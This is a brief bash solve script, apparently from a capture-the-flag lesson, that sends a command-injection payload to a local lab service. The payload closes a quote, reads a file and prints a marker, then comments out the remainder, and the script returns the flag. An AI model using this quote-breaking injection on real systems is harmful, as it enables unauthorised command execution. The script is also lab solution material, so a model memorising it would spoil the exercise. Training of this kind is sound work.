#!/usr/bin/env bash
# Lesson 1: close the quote, run a command, and comment out the suffix.
set -euo pipefail
read -r host port <<<"${TARGET:-127.0.0.1 30003}"
flag=$(python3 solution/one-shot.py "$host" "$port" 1 "pinecone' /srv/trails/scents.txt; printf BOONE_FOUND_1 #")
[[ -n "$flag" ]] || { echo "solve: no flag from $host:$port" >&2; exit 1; }
echo "$flag"
